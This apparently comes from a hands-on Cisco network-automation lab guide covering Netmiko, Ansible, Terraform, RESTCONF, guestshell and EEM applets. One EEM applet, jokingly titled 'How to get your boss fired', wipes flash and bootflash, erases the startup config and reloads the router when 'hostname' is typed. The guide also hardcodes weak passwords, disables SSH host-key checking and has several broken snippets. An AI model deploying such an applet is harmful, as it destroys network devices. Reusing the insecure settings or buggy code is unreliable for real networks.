
<!-- Your monitor number = #$34T# -->

## SETUP
Setup:  
  - RSTHayup: NetAuto Lab
  - CSR1000v
    - Name: DEVOPS-#$34T#
    - NetAdapter: NAT
    - NetAdapter 2: VMNet2
    - NetAdapter 3: Bridged (Replicate)

<br>

__RSTHayup: NetAuto__  

1. Turn on all devices, then run the python script from "Ex 03 - NetAuto"

<br>

2. Access NetAuto devices via SecureCRT

<br>

3. Set Static route on the real PC into the Lab Environment
~~~
!@cmd
route add 10.255.12.0 mask 255.255.252.0 [C1's e0/0 IP]
~~~

<br>
<br>

__CSR1000v__  

~~~
!@DEVOPS
conf t
 hostname DEVOPS-#$34T#
 enable secret pass
 service password-encryption
 no logging cons
 ip domain lookup
 ip name-server 8.8.8.8 8.8.4.4
 ip route 0.0.0.0 0.0.0.0 208.8.8.2
 ip route 10.0.0.0 255.0.0.0 10.#$34T#.1.4
 ip route 200.0.0.0 255.255.255.0 10.#$34T#.1.4
 !
 username admin priv 15 secret pass
 line vty 0 14
  transport input all
  password pass
  login local
  exec-timeout 0 0
 !
 int g1
  ip add 208.8.8.11 255.255.255.0
  no shut
 int g2
  ip add 192.168.102.11 255.255.255.0
  no shut
 int g3
  ip add 10.#$34T#.1.11 255.255.255.0
  no shut
 !
 ip http server
 ip http secure-server
 ip http authentication local
  end
~~~

<br>
<br>

---
&nbsp;

## AUTOMATION
### Shell Scripts
1. Output a basic Hello
~~~
@linux
nano hello.sh

///Edit hello.sh
echo "hello world"
///

chmod 500 hello.sh
./hello.sh
~~~

<br>

2. Create Multi users
~~~
@linux
nano add_user.sh

///add_user.sh
adduser m_user1
echo "m_user1:C1sc0123" | chpasswd

adduser m_user2
echo "m_user2:C1sc0123" | chpasswd

adduser m_user3
echo "m_user3:C1sc0123" | chpasswd
///

chmod 500 add_user.sh
./add_user.sh
~~~

<br>
<br>

---
&nbsp;

### Python
*Demo: Day1 via Python (Ex 01 - Day1)*

<br>

> Rivan_Day4 / Automation / _Python / Ex 01 - Day1 / run-all /

<br>
<br>

### TASK 01: Create a Python script that will apply a loopback IP (1.1.1.1/32) to CoreTaas
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

### TASK 02: Create a Python script that will save the configurations of CoreTAAS, CoreBABA, CUCM, & EDGE
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

<details>
<summary>Show Answer</summary>

~~~
from netmiko import ConnectHandler

list_of_device = input('What devices do you want to save configs? [ex. 10.12.1.2 10.12.1.4] ')
list_of_device = list_of_device.split()

### Device Information
device_info = {
    'device_type': 'cisco_ios_telnet',
    'host': '10.#$34T#.1.2',
    'username': 'admin',
    'password': 'pass',
    'secret': 'pass',
    'port': 23
}

for host in list_of_device:
    device_info['host'] = host
    
    try:
        ### Connect to Device
        access_cli = ConnectHandler(**device_info)
        access_cli.enable()

        output = access_cli.send_command('wr')
        print(output)

        ### Close Connection
        access_cli.disconnect()
        
    except Exception as e:
        print(f'''
Failed to Connect to Device: {host}:
Reason for failure: 
{e}
              ''')
~~~

</details>

<br>
<br>

---
&nbsp;

## Configuration and Infrastructure Management Tools. (Ansible, Terraform, Puppet, & Chef)
Setup 
  - NetOps:
    - Name: NetOps
    - NetAdapter: NAT
    - NetAdapter 2: Bridged (Replicate)
    - NetAdapter 3: VMnet4
    - NetAdapter 4: VMNet4

<br>

~~~
!@NetOps
nmcli connection add \
type ethernet \
con-name tunaynalan \
ifname ens192 \
ipv4.addresses 10.#$34T#.1.6/24 \
autoconnect yes

nmcli connection up tunaynalan
route add 10.0.0.0/8 via 10.#$34T#.1.4
route add 200.0.0.0/24 via 10.#$34T#.1.4
~~~

<br>

~~~
!@NetOps
ifconfig ens192 10.#$34T#.1.6 netmask 255.255.255.0 up
route add 10.0.0.0/8 via 10.#$34T#.1.4
route add 200.0.0.0/24 via 10.#$34T#.1.4
~~~


&nbsp;
---
&nbsp;

### Agentless vs Agentbased
Ansible - SSH (22)
Puppet - Master (8143) & Agent (8142)  
Chef - Server (10000 & 10002) & Client  

<br>

### Programming Language
Ansible - Python  
Chef & Puppet(.pp) - Ruby, DSL (Domain-specific Language)  
Terraform(.tf) - HCL (Hashicorp Configuration Language)  

<br>
<br>

---
&nbsp;

## Ansible
__Inventory__
- List of hosts/devices Ansible manages
- Can be grouped (e.g., routers, servers)
- Defines connection details (IP, SSH, network OS)
- Example formats: .ini, .yml

<br>

__Playbook__
- YAML file that tells Ansible what to do and where
- Contains one or more plays
- Human-readable automation steps

<br>

__Play__
- A section of a playbook
- Maps hosts to tasks
- Example: "Configure Cisco routers"

<br>

__Task__
- A single action Ansible performs on a host
- Executes a module
- Runs in order (top to bottom)

<br>

__Modules__
- Small programs Ansible uses to complete tasks
- Think: tools for automation
- Cisco examples: ios_config, ios_command
- Linux examples: apt, yum, copy

<br>

__Variables__
- Store changeable values (IPs, usernames, VLANs, etc.)
- Allow reuse and dynamic configs
- Can be defined in:
  - host_vars/hostname.yml
  - group_vars/groupname.yml
  - Inventory
  - Playbook
  - Included files

<br>

__Templates__
- Jinja2 files (.j2)
- Generate dynamic configuration
- Pull values from variables

<br>

__Handlers__
- Special tasks triggered only when notified
- Used for actions like restarting services after a change

<br>

__Roles__
- A structured way to organize automation
- Makes code clean and reusable
- Standard directory layout:

<br>

__Facts__
- System/network information gathered automatically
- Usually disabled for Cisco network automation (gather_facts: no)

<br>

__ansible.cfg__
- Local configuration file
- Controls Ansible behavior
- Can set default inventory, roles path, logging, etc.

<br>
<br>

---
&nbsp;

### Task 03: Create an Ansible script to add loopback addresses to Cisco Devices.
*What if they have different credentials?*

~~~
!@CoreTAAS,CoreBABA
conf t
 enable secret pass
 username admin priv 15 secret pass
 username rivan priv 15 secret C1sc0123
 line vty 0 14
  password pass
  transport input all
  login local
  end
~~~

<br>

__Playbook (add_loop.yml)__
~~~
---
- name: addloop
  hosts: realdevices
  gather_facts: no
  become: yes
  tasks:
    - name: "Create Loopbacks"
      ios_command:
        commands:
          - conf t
          - int lo100
          - ip add 100.100.100.100 255.255.255.255
          - exit
          - int lo101
          - ip add 101.101.101.101 255.255.255.255
          - exit
          - int lo102
          - ip add 102.102.102.102 255.255.255.255
      vars:
        ansible_network_os: ios
~~~

<br>

__hosts (Inventory)__
~~~
[CoreBaba]
10.11.1.4

[CoreBaba:vars]
ansible_user=admin
ansible_password=C1sc0123
ansible_connection=network_cli
ansible_network_os=ios
~~~

&nbsp;
---
&nbsp;

__Ansible Folder Structure__
~~~
ansible-network-project/
    ├── ansible.cfg
    ├── inventory/
    │   └── hosts
    │
    ├── group_vars/
    │   └── ios.yml          # Shared variables for IOS devices
    │
    ├── host_vars/
    │   ├── R1.yml           # R1-specific variables
    │   └── R2.yml           # R2-specific variables
    │
    ├── templates/
    │   ├── base_config.j2   # Router base configuration template
    │   └── interfaces.j2    # Dynamic interface config template
    │
    ├── playbooks/
    │   ├── deploy-base.yml  # Applies base config template
    │   └── deploy-int.yml   # Applies interface template
    │
    └── files/
        └── ssh_pub.key      # Example file to copy (optional)
~~~

<br>

&nbsp;
---
&nbsp;

Setup the project workspace:
~~~
!@NetOps
mkdir -p /etc/ansible/ansible_project/{inventory,host_vars,playbooks,templates,roles}
~~~

<br>

~~~
/etc/ansible/ansible_project/
    ├── inventory/
    │   └── hosts
    │
    ├── group_vars/
    │   └── ios.yml
    │
    ├── host_vars/
    │   ├── R1.yml
    │   └── R2.yml
    │
    ├── templates/
    │   ├── base_config.j2
    │   └── interfaces.j2
    │
    ├── playbooks/
    │   ├── deploy-base.yml
    │   └── deploy-int.yml
    │
    └── files/
        └── ssh_pub.key
~~~

__Hosts__  
ansible_project/inventory/real_devices.ini
~~~
[real_cisco]
CTAAS ansible_host=10.#$34T#.1.2
CBABA ansible_host=10.#$34T#.1.4
CUCM ansible_host=10.#$34T#.100.8
EDGE ansible_host=10.#$34T#.#$34T#.1

[real_cisco:vars]
ansible_connection=network_cli
ansible_port=22
ansible_become=yes
ansible_become_method=enable
ansible_network_os=ios
~~~

<br>

__Host Variables__  
ansible_project/host_vars/CTAAS.yml  
~~~
### CoreTAAS Credentials
ansible_user=admin
ansible_password=pass
ansible_become_password=pass
~~~

<br>

ansible_project/host_vars/CBABA.yml  
~~~
### CoreBABA Credentials
ansible_user=rivan
ansible_password=C1sc0123
ansible_become_password=pass
~~~

<br>

__Templates__
ansible_project/templates/interfaces.j2
~~~
{% for intlist in interfaces %}
interface {{ intlist.name }}
  description {{ intlist.desc }}
  ip address {{ intlist.ip }} {{ intlist.mask }}
  no shutdown
{% endfor %}
~~~

<br>

ansible_project/playbooks/deploy_int.yml
~~~
- name: Apply interface configurations
  hosts: real_cisco
  gather_facts: no

  tasks:
    - name: Load Variables for devices
      include_vars: 
        - '../host_vars/CTAAS.yml'
        - '../host_vars/CBABA.yml'

    - name: Render and push interface configs
      cisco.ios.ios_config:
        src: templates/interfaces.j2
~~~

<br>

__Adding Host Values__
ansible_project/host_vars/CTAAS.yml  
~~~
### For adding loopbacks
interfaces:
  - name: Loopback1
    desc: Made via Ansible
    ip: #$34T#.0.1.2
    mask: 255.255.255.255

  - name: Loopback2
    desc: Made via Ansible
    ip: #$34T#.0.2.2
    mask: 255.255.255.255
~~~

<br>

ansible_project/host_vars/CBABA.yml  
~~~
### For adding loopbacks
interfaces:
  - name: Loopback1
    desc: Made via Ansible
    ip: #$34T#.0.1.4
    mask: 255.255.255.255

  - name: Loopback2
    desc: Made via Ansible
    ip: #$34T#.0.2.4
    mask: 255.255.255.255
~~~

<br>

__Other Attributes__
~~~
ansible_ssh_private_key_file: ~/.ssh/id_rsa
ansible_ssh_pass: yourKeyPassphrase
ansible_ssh_common_args: "-o StrictHostKeyChecking=no"
~~~

<br>

__Execute the script__
~~~
!@NetOps
ansible-playbook -i inventory/real_devices.ini playbooks/deply_dhcp.yml
~~~

<br>
<br>

---
&nbsp;

### Task 04: Create add a template to create DHCP Pools.

__Templates__
ansible_project/templates/dhcp_scope.j2
~~~
{% for entry in dhcp_pool %}
ip dhcp excluded-address {{ entry.exclude_first }} {{ entry.exclude_last }}
ip dhcp pool {{ entry.name }}
  network {{ entry.network }} {{ entry.net_mask }}
  default_router {{ entry.gateway }}
  dns-server {{ entry.dns_server }}
  domain-name {{ entry.domain_name }}
{% endfor %}
~~~

<br>

__Host Variables__
ansible_project/host_vars/core.yml  
~~~
dhcp_pool: 
  - name: adminpool
    network: 10.11.1.0
    net_mask: 255.255.255.0
    gateway: 10.11.1.1
    dns_server: 10.11.1.10
    domain_name: TEST.COM
    exclude_first: 10.11.1.1
    exclude_last: 10.11.1.100

  - name: hrpool
    network: 10.22.1.0
    net_mask: 255.255.255.0
    gateway: 10.22.1.1
    dns_server: 10.22.1.10
    domain_name: HR.COM
    exclude_first: 10.22.1.1
    exclude_last: 10.22.1.100
~~~

<br>

__Playbook__
ansible_project/playbooks/deploy_dhcp.yml
~~~
- name: Deploy DHCP Scopes
  host: virtual_cisco
  gather_facts: no

  tasks:
    - name: Load Variables
      include_vars: '../host_vars/core.yml'
    
    - name: Create DHCP Pools
      cisco.ios.ios_config:
        src: ../templates/dhcp_scope.j2
~~~

<br>
<br>

---
&nbsp;

### TERRAFORM
Enable RESTCONF

~~~
!@DEVOPS-#$34T#
conf t
 username admin privilege 15 secret pass
 ip http secure-server
 ip http authentication local
 restconf
end
~~~

<br>

__HCL (.tf File)__
~~~
terraform {
  required_providers {
    iosxe = {
      source = "CiscoDevNet/iosxe"
    }
  }
}

provider "iosxe" {
  username = "admin"
  password = "pass"
  url      = "https://10.11.11.1"
}

resource "iosxe_interface_loopback" "example" {
  name               = 200
  description        = "My First TF Script Attempt"
  shutdown           = false
  ipv4_address       = "2.2.2.2"
  ipv4_address_mask  = "255.255.255.255"
}
~~~

<br>
<br>

---
&nbsp;

### CHEF
__Cookbook__  
__Recipe (default.rb file)__

~~~
cisco_ios_config 'set_hostname_and_ssh' do
  config_lines [
    "hostname #{node['cisco_ios_config']['hostname']}",
	"ip domain-name #{node[cisco_ios_config]['domain_name']}",
	"crypto key generate rsa modulus 2048",
	"ip ssh version 2",
	"line vty 0 4",
	"transport input all",
	"login local"
  ]
  action :apply
end
~~~

<br>

__Credentials__
~~~
['CoreBaba']
Host = '192.168.240.2'
User = 'admin'
Password = 'password'
~~~

&nbsp;
---
&nbsp;

### PUPPET
__Manifest (.pp Pocket Physics file)__
~~~
node 'cisco.example.com' {
  cisco_ios_interface { 'GigabitEthernet0/1':
    ensure => present,
    description => "Uplink to Core",
    speed => 'auto',
    duplex => 'auto',
    vlan_access => '10',
  }
}
~~~

<br>

__Device.conf (Inventory)__
~~~
[rivan.com]
type cisco_ios_interfaceurl file:////etc/puppetlabs/puppet/devices/rivan.com.conf
~~~

<br>

__Credentials__
~~~
host: "10.#$34T#.1.4"
port: 22
user: admin
password: password
enable_password: password
~~~

<br>
<br>

---
&nbsp;

### RESTCONF
~~~
!@DEVOPS-#$34T#
conf t
 username admin privilege 15 secret pass
 ip http secure-server
 ip http authentication local
 restconf
end
~~~

YANG Data Models
HTTP Methods
- GET
- POST
- PUT
- PATCH
- DELETE

<br>

RESTCONF vs NETCONF
- REST : HTTP/HTTPS
- NET : XML over SSH

<br>
<br>

---
&nbsp;

### Cisco IOX
1. Create a Virtual Port Group for IOX Container Network

> [!NOTE]
> app-vnic gateway0 is used by most apps.
> Make sure appid is lowercase.

<br>

~~~
!@DEVOPS-#$34T#
conf t
 iox
 !
 interface VirtualPortGroup0
  ip address 192.168.255.1 255.255.255.0
  ip nat inside
  exit
 !
 app-hosting appid guestshell
  app-vnic gateway0 virtualportgroup 0 guest-interface 0
   guest-ipaddress 192.168.255.11 netmask 255.255.255.0	
  app-default-gateway 192.168.255.1 guest-interface 0 
  name-server0 8.8.8.8
  app-resource profile custom
   cpu 1500 
   memory 512
   persist-disk 1000
   end
~~~

<br>

2. Enable App Instance
~~~
!@DEVOPS-#$34T#
guestshell enable
~~~

After the app is enabled, on a different telnet sessions:
~~~
!@DEVOPS-#$34T# - BASH
guestshell run bash
~~~

<br>

~~~
!@DEVOPS-#$34T# - PYTHON
guestshell run python3
~~~


<br>

3. Manage Linux Packages
> [!IMPORTANT]
> Update the repo stream link
> Include repolist & epel-release

~~~
!@DEVOPS-#$34T# - BASH
sudo su
cd /etc/yum.repos.d/
sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
yum repolist
yum install epel-release -y
yum install nano -y
~~~

<br>

Install Applications:  
~~~
!@DEVOPS-#$34T# - BASH
yum install nmap -y
yum install bind bind-utils -y
yum install python3 -y
yum install python38 -y
yum install git -y
~~~

<br>

Install Python Libraries:  
~~~
!@DEVOPS-#$34T# - BASH
python3 -m pip install --upgrade pip
python3 -m pip install cryptography
python3 -m pip install netmiko
python3 -m pip install "netmiko<4.0"
~~~

<br>
<br>

---
&nbsp;

### Task 05: Utilize CLI module (Cisco Proprietary Module) to send commands from guestshell to the cisco device.
Send cisco show commands
~~~
!@DEVOPS-#$34T# - PYTHON
import cli

cli.executep('show ip int brief)
~~~

<br>

Send Configurations
~~~
!@DEVOPS-#$34T# - PYTHON
import cli

commands = '''
hostname NETDEVOPS
'''

cli.configurep(commands)
~~~

<br>

~~~
!@DEVOPS-#$34T# - PYTHON
import cli

commands = '''
int loop 1
ip add 1.1.1.1 255.255.255.255
int loop 2
ip add 2.2.2.2 255.255.255.255
'''
~~~

<br>
<br>

---
&nbsp;

### Task 06: Create a python script to save and send configs via FTP on a 1 min Timer
~~~
!@DEVOPS-#$34T# - BASH
cd /home/guestshell
nano save_ftp.py
~~~

<br>

~~~
from netmiko import ConnectHandler
import time

ftp_server = input('FTP Server IP: ')
filename = input('Filename: ')
save_timer = input('Save Interval: ')
max_save = int(input('Maximum Save: '))
command = f'copy run tftp'


devices = input('Host Addresses [ex. 10.1.1.1 10.2.2.2]: ')
devices = devices.split()
device_info = {
    'device_type': 'cisco_ios_telnet',
    'host': '192.168.255.1',
    'username': 'admin',
    'password': 'pass',
    'secret': 'pass',
    'port': 23
}

while max_save > 0:
    while True:
        for host in devices:
            try:
                access_cli = ConnectHandler(**device_info)
                access_cli.enable()
            
                output = access_cli.send_command_timing(command)
                print(output + '\n\n')
                if 'host' in output:
                    output = access_cli.send_command_timing(ftp_server)
                    print(output + '\n\n')
                if 'filename' in output:
                    output = access_cli.send_command_timing(filename)
                    print(output + '\n\n')

                access_cli.disconnect()

            except Exception as fail:
                print(f'''
Error on host {host}: 
Error Occured: {fail}
''')
            max_save -= 1
        
        time.sleep(save_interval)
~~~

<br>

~~~
!@DEVOPS-#$34T#
guestshell run python3 save_ftp.py
~~~

<br>
<br>

---
&nbsp;

### EEM
1. Keep interfaces alive
~~~
!@DEVOPS-#$34T#
config t
no event manager applet WatchLo0
event manager applet WatchLo0
  event syslog pattern "Interface Loopback0.* down" period 1
  action 2.0 cli command "enable"
  action 2.1 cli command "config t"
  action 2.2 cli command "interface lo0"
  action 2.3 cli command "no shutdown"
  action 3.0 syslog msg "BETTER LUCK GagoKA!!,MATIK Loopback0 was brought up via EEM"
  end
event manager run WatchLo0
~~~

<br>

2. Send basic command
~~~
!@DEVOPS-#$34T#
config t
no event manager applet addloop
event manager applet addloop
  event none
  action 1.0 puts "What will be the loopback interface number?"
  action 1.1 puts nonewline "> "
  action 1.2 gets int 
  action 2.0 puts "What will be the loopback IP on loopback $int?"
  action 2.1 puts nonewline "> "
  action 2.2 gets loopip
  action 3.0 cli command "enable"
  action 3.1 cli command "conf t"
  action 3.2 cli command "interface Loopback $int"
  action 3.3 cli command "ip address $loopip 255.255.255.255"
  action 4.0 cli command "end"
  end
event manager run addloop

~~~


<br>

3. Generate Loopbacks
~~~
!@DEVOPS-#$34T#
config t
no event manager applet createloop
event manager applet createloop
  event none
  action 1.0 puts "How many Loopback interfaces do you wish to create?"
  action 1.1 puts nonewline "> "
  action 1.2 gets num 
  action 2.0 cli command "enable"
  action 2.1 cli command "conf t"
  action 3.0 set i "1"
  action 3.1 while $i le $num
  action 3.2  cli command "interface Loopback $i"
  action 3.3  cli command "ip address $i.$i.$i.$i 255.255.255.255"
  action 3.4  increment i 1
  action 3.5 end
  action 4.0 cli command "end"
  end

event manager run createloop
~~~

<br>

4. Delete Loopbacks
~~~
!@DEVOPS-#$34T#
config t
no event manager applet removeloop
event manager applet removeloop
  event none
  action 1.0 puts "How many Loopback interfaces do you wish to create?"
  action 1.1 puts nonewline "> "
  action 1.2 gets num 
  action 2.0 cli command "enable"
  action 2.1 cli command "conf t"
  action 3.0 set i "1"
  action 3.1 while $i le $num
  action 3.2  cli command "no interface Loopback $i"
  action 3.4  increment i 1
  action 3.5 end
  action 4.0 cli command "end"
  end
event manager run removeloop
~~~

<br>

5. How to get your boss fired
~~~
!@DEVOPS-#$34T#
config t
no event manager applet byebye
event manager applet byebye
  event cli pattern "hostname" sync no skip yes
  action 1.0 cli command "delete /force /recursive flash:"
  action 1.1 cli command "delete /force /recursive bootflash:"
  action 1.2 cli command "erase startup-config"
  action 2.0 syslog msg "Deleting flash and rebooting the device.. BYE BYE"
  action 3.0 reload
  end
event manager run byebye
~~~

<br>
<br>

---
&nbsp;

### Exercise 01: Configure Cisco using various automation tools.
Remove all current loopbacks, then create loopbacks via the following methods: 
| Loopback | IP Address | Method                    |
| ---      | ---        | ---                       |
| 1        | 1.1.1.1    | Manually                  |
| 2        | 2.2.2.2    | Python (using CLI module) |
| 3        | 3.3.3.3    | Python (using Netmiko)    |
| 4        | 4.4.4.4    | Ansible                   |
| 5        | 5.5.5.5    | Terraform                 |
| 6        | 6.6.6.6    | RESTCONF (Postman)        |
| 7        | 7.7.7.7    | EEM                       |




